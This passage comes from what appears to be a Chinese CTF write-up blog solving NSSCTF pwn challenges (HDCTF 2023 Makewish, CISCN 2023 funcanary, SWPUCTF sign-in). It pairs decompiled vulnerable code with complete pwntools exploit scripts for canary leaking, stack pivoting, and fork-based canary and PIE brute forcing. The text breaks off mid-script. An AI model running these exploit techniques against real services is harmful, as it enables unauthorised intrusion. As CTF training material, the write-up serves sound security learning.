class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Loading gadgets <span class="keyword">for</span> <span class="string">&#x27;/home/pwn/pwn/nssctf/11.13/HDCTF_2023_Makewish/pwn&#x27;</span></span><br><span class="line">[*] ret addr : 0x4005d9</span><br><span class="line">[*] rdi addr : 0x400993</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./pwn&#x27;</span> (pid 19701)</span><br></pre></td></tr></table></figure>

<p>发现开启了NX和Canary</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v5 = rand() % <span class="number">1000</span> + <span class="number">324</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me you name\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);<span class="comment">//可以泄露canary</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me key\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v4 )</span><br><span class="line">    <span class="keyword">return</span> vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to HDctf,You can make a wish to me&quot;</span>);</span><br><span class="line">  buf[(<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL)] = <span class="number">0</span>;<span class="comment">//off_by_null</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sorry,i can&#x27;t do that&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体为什么能够栈迁移呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004008E5</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004008</span>EA                 call    _read</span><br><span class="line">.text:<span class="number">00000000004008</span>EF                 mov     eax, [rbp+var_38]</span><br><span class="line">.text:<span class="number">00000000004008F</span>2                 cmp     [rbp+var_34], eax</span><br><span class="line">.text:<span class="number">00000000004008F</span>5                 jnz     <span class="type">short</span> loc_400905</span><br><span class="line">.text:<span class="number">00000000004008F</span>7                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004008F</span>C                 call    vuln</span><br><span class="line">.text:<span class="number">0000000000400901</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000400902</span>                 retn</span><br></pre></td></tr></table></figure>

<p>一开始我不理解的，但是看汇编就理解了调用了vuln函数结束leave;ret篡改了ebp导致ebp的值为fake_ebp，然而esp正常执行完vuln后再次执行leave;ret;就修改了esp为ebp也就指向了fake_ebp，然后ret就是<code>add esp+4;mov eip,[esp-4]</code>​我们只能返回到00也就是得多写ret来保证成功率，这样返回00能滑到后门函数中</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241113100353-feh0kc6.png" alt="image">​</p>
<p>可以覆盖至canary</p>
<p>发现key是0x2c3</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241113100954-5ai79x6.png" alt="image">​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from <span class="keyword">struct</span> import pack</span><br><span class="line">from ctypes import *</span><br><span class="line">from pwn import *</span><br><span class="line">def <span class="title function_">s</span><span class="params">(a)</span> : p.<span class="title function_">send</span><span class="params">(a)</span></span><br><span class="line">def <span class="title function_">sa</span><span class="params">(a, b)</span> : p.<span class="title function_">sendafter</span><span class="params">(a, b)</span></span><br><span class="line">def <span class="title function_">sl</span><span class="params">(a)</span> : p.<span class="title function_">sendline</span><span class="params">(a)</span></span><br><span class="line">def <span class="title function_">sla</span><span class="params">(a, b)</span> : p.<span class="title function_">sendlineafter</span><span class="params">(a, b)</span></span><br><span class="line">def <span class="title function_">r</span><span class="params">()</span> : <span class="keyword">return</span> p.<span class="title function_">recv</span><span class="params">()</span></span><br><span class="line">def <span class="title function_">pr</span><span class="params">()</span> : <span class="title function_">print</span><span class="params">(p.recv())</span></span><br><span class="line">def <span class="title function_">rl</span><span class="params">(a)</span> : <span class="keyword">return</span> p.<span class="title function_">recvuntil</span><span class="params">(a)</span></span><br><span class="line">def <span class="title function_">inter</span><span class="params">()</span> : p.<span class="title function_">interactive</span><span class="params">()</span></span><br><span class="line">def <span class="title function_">debug</span><span class="params">()</span>:</span><br><span class="line">    gdb.<span class="title function_">attach</span><span class="params">(p)</span></span><br><span class="line">    <span class="title function_">pause</span><span class="params">()</span></span><br><span class="line">def <span class="title function_">get_addr</span><span class="params">()</span> : <span class="keyword">return</span> <span class="title function_">u64</span><span class="params">(p.recvuntil(b<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&#x27;\x00&#x27;</span>))</span></span><br><span class="line"><span class="meta"># def get_sb() : return libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + next(libc.search(b<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span></span><br><span class="line">def <span class="title function_">csu</span><span class="params">(rdi, rsi, rdx, rip, gadget)</span> : <span class="keyword">return</span> <span class="title function_">p64</span><span class="params">(gadget)</span> + <span class="title function_">p64</span><span class="params">(<span class="number">0</span>)</span> + <span class="title function_">p64</span><span class="params">(<span class="number">1</span>)</span> + <span class="title function_">p64</span><span class="params">(rip)</span> + <span class="title function_">p64</span><span class="params">(rdi)</span> + <span class="title function_">p64</span><span class="params">(rsi)</span> + <span class="title function_">p64</span><span class="params">(rdx)</span> + <span class="title function_">p64</span><span class="params">(gadget - <span class="number">0x1a</span>)</span></span><br><span class="line">def <span class="title function_">get_32_addr</span><span class="params">()</span>:	<span class="keyword">return</span> <span class="title function_">u32</span><span class="params">(p.recvuntil(b<span class="string">&#x27;\xf7&#x27;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>, b<span class="string">&#x27;\x00&#x27;</span>))</span></span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">pwn</span><span class="params">()</span>:</span><br><span class="line">    <span class="title function_">sl</span><span class="params">(<span class="string">&quot;A&quot;</span>*<span class="number">0x28</span>)</span></span><br><span class="line">    <span class="title function_">rl</span><span class="params">(b<span class="string">&quot;A&quot;</span>*<span class="number">0x28</span> + b<span class="string">&#x27;\x0a&#x27;</span>)</span></span><br><span class="line">    canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    success(<span class="string">&quot;canary: &#123;:#x&#125;&quot;</span>.format(canary))</span><br><span class="line">    s(p32(<span class="number">0x2c3</span>))</span><br><span class="line">    s(p64(ret)*<span class="number">10</span> + p64(<span class="number">0x0000000004007C7</span>) + p64(canary) )</span><br><span class="line">    <span class="meta"># debug()</span></span><br><span class="line">    r()</span><br><span class="line">    <span class="meta"># sl(<span class="string">&quot;id&quot;</span>)</span></span><br><span class="line">    pr()</span><br><span class="line">    inter()</span><br><span class="line">    <span class="meta"># <span class="keyword">if</span> b<span class="string">&quot;uid&quot;</span> in r():</span></span><br><span class="line">    <span class="meta">#     inter()</span></span><br><span class="line">    <span class="meta"># <span class="keyword">else</span>:</span></span><br><span class="line">    <span class="meta">#     p.close()</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">            context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">            ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">            port = <span class="number">28036</span></span><br><span class="line">            p = remote(ip, port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">            info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.format(p.pid))</span><br><span class="line">        elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">        <span class="meta">#libc = ELF(<span class="string">&#x27;./libc-2.23-x64.so&#x27;</span>)</span></span><br><span class="line">        <span class="meta"># clibc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span></span><br><span class="line">        rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">        ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">        pwn()</span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<h3 id="CISCN-2023-初赛-funcanary"><a href="#CISCN-2023-初赛-funcanary" class="headerlink" title="[CISCN 2023 初赛]funcanary"></a>[CISCN 2023 初赛]funcanary</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwn @ DESKTOP-D3OTKCS in ~/pwn/nssctf/11.13/CISCN_2023_初赛_funcanary [10:46:01] C:1</span></span><br><span class="line">$ python3 exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 35742</span><br><span class="line">[*] pid: 35742</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/pwn/nssctf/11.13/CISCN_2023_初赛_funcanary/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">[*] Loaded 5 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">[*] ret addr : 0x101a</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./pwn&#x27;</span> (pid 35742)</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1243(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">      sub_128A();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;have fun&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_128A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有溢出有canary有pie，存在fork函数，我了个爆破啊</p>
<p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">26690</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># rdi = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span></span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line"><span class="comment"># info(&quot;rdi addr : &#123;:#x&#125;&quot;.format(rdi))</span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">sa(<span class="string">&#x27;welcome\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + canary + p8(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">		sa(<span class="string">&#x27;welcome\n&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + canary + p8(j))</span><br><span class="line">		<span class="keyword">if</span> p.recv(<span class="number">2</span>) == <span class="string">b&#x27;ha&#x27;</span>:</span><br><span class="line">			canary += p8(j)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">catflag = <span class="number">0x0231</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p16(catflag)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;welcome&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                catflag += <span class="number">0x1000</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;NSSCTF&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>外部连接很慢，爆破了十几分钟</p>
<h3 id="SWPUCTF-2023-秋季新生赛-签到"><a href="#SWPUCTF-2023-秋季新生赛-签到" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]签到"></a>[SWPUCTF 2023 秋季新生赛]签到</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span 